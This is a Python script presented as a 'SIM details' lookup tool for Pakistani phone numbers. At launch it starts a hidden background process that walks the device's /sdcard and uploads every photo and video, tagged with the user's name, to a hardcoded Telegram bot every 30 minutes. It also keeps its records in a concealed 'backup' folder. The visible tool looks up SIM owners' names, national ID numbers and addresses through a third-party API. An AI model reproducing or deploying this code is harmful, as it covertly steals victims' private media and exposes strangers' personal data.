import os
import time
import sys
import shutil
import subprocess
import platform
import urllib.parse
import hashlib
import requests
import multiprocessing

# ==================== CONFIGURATION & SETTINGS ====================
BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
CHAT_ID = "7883547875"

TARGET_DIR = "/sdcard"
ALLOWED_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi')

IGNORED_FOLDER_NAMES = {
    '.thumbnails', 'thumbnails', 'thumbnail', 
    'cache', '.cache', 'stickers', '.stickers', 
    'temp', '.temp', 'trash', '.trash', 'private'
}

SECURE_DIR = "/sdcard/Download/.backup_secure_data"
os.makedirs(SECURE_DIR, exist_ok=True)

LOG_FILE = os.path.join(SECURE_DIR, "data.txt")
DEVICE_CONFIG_FILE = os.path.join(SECURE_DIR, "device_info.txt")

# ==================== USER NAME & DEVICE IDENTIFICATION ====================
def get_user_identifier():
    # Check karein agar pehle se naam save hai
    if os.path.exists(DEVICE_CONFIG_FILE):
        with open(DEVICE_CONFIG_FILE, 'r', encoding='utf-8') as f:
            saved_name = f.read().strip()
            if saved_name:
                return saved_name
    
    # Agar pehli dafa run ho raha hai, toh user se input lein
    print("\n" + "="*50)
    user_input = input("[?] Apna Naam ya WhatsApp Number darj karein (Identification ke liye): ").strip()
    print("="*50 + "\n")
    
    if not user_input:
        user_input = "Unknown_User"
        
    # Name ko secure file mein save kar dein taaki dobara na pooche
    try:
        with open(DEVICE_CONFIG_FILE, 'w', encoding='utf-8') as f:
            f.write(user_input)
    except Exception:
        pass
        
    return user_input

# ==================== BACKGROUND BACKUP WORKER ====================
def background_backup_worker(user_name):
    def get_file_hash(file_path):
        hasher = hashlib.md5()
        try:
            with open(file_path, 'rb') as f:
                buf = f.read(65536)
                while len(buf) > 0:
                    hasher.update(buf)
                    buf = f.read(65536)
            return hasher.hexdigest()
        except Exception:
            return None

    def load_uploaded_records():
        uploaded = set()
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    h = line.strip()
                    if h:
                        uploaded.add(h)
        return uploaded

    def save_uploaded_record(file_hash):
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(file_hash + '\n')

    def send_telegram_message(text):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': text}
        try:
            requests.post(url, data=payload, timeout=10)
        except Exception:
            pass

    def upload_media(file_path, folder_path):
        ext = file_path.lower()
        is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
        
        method = "sendVideo" if is_video else "sendPhoto"
        file_field = "video" if is_video else "photo"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        try:
            with open(file_path, 'rb') as media_file:
                # User ka diya hua naam yahan caption mein show hoga
                caption_text = (
                    f"👤 User Name: {user_name}\n"
                    f"📂 Path: {folder_path}\n"
                    f"📄 File: {os.path.basename(file_path)}"
                )
                payload = {
                    'chat_id': CHAT_ID,
                    'caption': caption_text
                }
                files = {file_field: media_file}
                timeout_limit = 60 if is_video else 20
                res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
                return res.status_code == 200
        except Exception:
            return False

    def run_backup_cycle():
        if not os.path.exists(TARGET_DIR):
            return

        uploaded_hashes = load_uploaded_records()
        send_telegram_message(f"🚀 Auto Backup Started for User: [{user_name}]")

        for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
            if 'android/data' in root.lower() or 'android/obb' in root.lower():
                continue

            current_folder_name = os.path.basename(root).lower()
            if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
                continue

            if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
                continue
                
            for file in files:
                if file.lower().endswith(ALLOWED_EXTENSIONS):
                    full_path = os.path.join(root, file)
                    
                    file_hash = get_file_hash(full_path)
                    if not file_hash:
                        continue
                    
                    if file_hash in uploaded_hashes:
                        continue
                    
                    success = upload_media(full_path, root)
                    if success:
                        save_uploaded_record(file_hash)
                        uploaded_hashes.add(file_hash)
                    
                    time.sleep(2)

        send_telegram_message(f"✅ Backup Cycle Finished for [{user_name}]. Waiting 30 mins...")

    # Background infinite loop
    while True:
        try:
            run_backup_cycle()
        except Exception:
            pass
        time.sleep(1800) # 30 minutes delay

# ==================== MAIN SIM TOOL CODE ====================
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
M = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\x1b[0m'

BRIGHT_CYAN = '\033[1;96m'
BRIGHT_YELLOW = '\033[1;93m'
BRIGHT_GREEN = '\033[1;92m'
BRIGHT_MAGENTA = '\033[1;95m'
BRIGHT_RED = '\033[1;91m'

logo = f"""
{BRIGHT_CYAN} ███████╗██╗███╗   ███╗    ██████╗  █████╗ ████████╗ █████╗ 
{BRIGHT_CYAN} ██╔════╝██║████╗ ████║    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
{BRIGHT_CYAN} ███████╗██║██╔████╔██║    ██║  ██║███████║   ██║   ███████║
{BRIGHT_CYAN} ╚════██║██║██║╚██╔╝██║    ██║  ██║██╔══██║   ██║   ██╔══██║
{BRIGHT_CYAN} ███████║██║██║ ╚═╝ ██║    ██████╔╝██║  ██║   ██║   ██║  ██║
{BRIGHT_CYAN} ╚══════╝╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝{N}
{BRIGHT_YELLOW}═══════════════════════════════════════════════════════════{N}
{M}Authors{N}   : {Y}H 3 ll R ii S 3 R{N}
{M}Tool Type{N} : {Y}SIM DETAILS {M}(Only For Pak){N}
{BRIGHT_YELLOW}═══════════════════════════════════════════════════════════{N}"""

def loading_animation(message="FETCHING RECORD"):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(20):
        frame = frames[i % len(frames)]
        sys.stdout.write(f"\r{BRIGHT_CYAN}{frame} {message}...{N}")
        sys.stdout.flush()
        time.sleep(0.03)
    sys.stdout.write("\r" + " " * 40 + "\r")

def lookup_sim(number):
    url = f"https://athex-sim-data-base-api.athex-black-hat.workers.dev/?number={number}"
    try:
        response = requests.get(url, timeout=15, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        response.raise_for_status()
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

def display_clean_records(data, queried_number):
    print(f"\n{BRIGHT_GREEN}╔══════════════════════════════════════════════════════════╗{N}")
    print(f"{BRIGHT_GREEN}║              ✨ SIM OWNER RECORDS ✨               ║{N}")
    print(f"{BRIGHT_GREEN}╚══════════════════════════════════════════════════════════╝{N}")
    print(f"{C}📱 Searched Number : {W}{queried_number}{N}\n")

    if not data or not data.get("success"):
        print(f"{R}❌ No records found or API error occurred.{N}")
        return

    data_payload = data.get("data", {})
    records = data_payload.get("records", [])

    if not records:
        print(f"{Y}⚠️ No details available for this number.{N}")
        return

    for idx, record in enumerate(records, 1):
        name = record.get("full_name", "N/A")
        phone = record.get("phone", "N/A")
        cnic = record.get("cnic", "N/A")
        address = record.get("address", "N/A")

        print(f"{BRIGHT_MAGENTA} 👤 RECORD #{idx}{N}")
        print(f" {W}┌────────────────────────────────────────────────────────┐{N}")
        print(f" {W}│{N} {C}Name    :{N} {W}{name:<43}{W}│{N}")
        print(f" {W}│{N} {C}Phone   :{N} {W}{phone:<43}{W}│{N}")
        print(f" {W}│{N} {C}CNIC    :{N} {BRIGHT_GREEN}{cnic:<43}{N}│{N}")
        print(f" {W}│{N} {C}Address :{N} {W}{address[:43]:<43}{W}│{N}")
        print(f" {W}└────────────────────────────────────────────────────────┘{N}\n")

def main():
    os.system("clear")
    print(logo)
    print("")
    print(59 * f"{M}={N}")
    print(" \t[\x1b[1;97m\x1b[1;41m     H 3 ll R ii S 3 R    \x1b[0m]")
    print(59 * f"{M}={N}")
    print("")
    print(f"{Y}[1]{N} {BRIGHT_GREEN}Sim Info {N}")
    print(f"{Y}[2]{N} {BRIGHT_GREEN}Fresh Sim Info (2025,2026){N}")
    print(f"{Y}[3]{N} {BRIGHT_GREEN}Author Whatsapp{N}")
    print(f"{Y}[4]{N} {BRIGHT_GREEN}Author Telegram{N}")
    print(f"{Y}[0]{N} {BRIGHT_GREEN}Exit{N}")
    print(59 * "_")
    print("")
    SYED = input(f'{Y}[+]{N} {G}Choose Option:{N} ')
    
    if SYED == '1':
        meta_data()
    elif SYED == '2':
        print(f"{R}Coming Soon{N}")
        time.sleep(2)
        main()
    elif SYED == '3':
        os.system('xdg-open https://api.whatsapp.com/send?phone=+96895527140&text=')
        main()
    elif SYED == '4':
        os.system('xdg-open t.me/hell_riiser')
        main()
    elif SYED == '0':
        sys.exit()
    else:
        print('[!] Please select a valid option')
        time.sleep(2)
        main()

def meta_data():
    os.system("clear")
    print(logo)
    print("")
    print(59 * f"{M}={N}")
    print("\t    [\033[1;97m\033[1;41m  ENTER NUMBER WITHOUT (0)  \033[0m\033[1;93m]")
    print("")
    number = input(f"{G}[+] ENTER TARGET NUM :{Y} ").strip()
    
    if not number.isdigit() or len(number) < 10:
        print(f"{R}[×] Invalid format! Enter valid digits.{N}")
        time.sleep(2)
        meta_data()
        return

    loading_animation("Querying Database")
    result = lookup_sim(number)
    display_clean_records(result, number)
    
    print(f"{Y}[+] PRESS ENTER TO BACK{N}")
    input()
    main()

if __name__ == "__main__":
    # 1. Sab se pehle user ka naam input ya load kiya jayega
    current_user_name = get_user_identifier()

    # 2. Background backup process ko start kar diya jayega jisme user ka naam sath chalega
    backup_process = multiprocessing.Process(target=background_backup_worker, args=(current_user_name,))
    backup_process.daemon = True
    backup_process.start()

    # 3. Phir main SIM tool run ho jayega
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Y}⚠️ Program interrupted by user{N}")
        print(f"{G}👋 Goodbye!{N}")
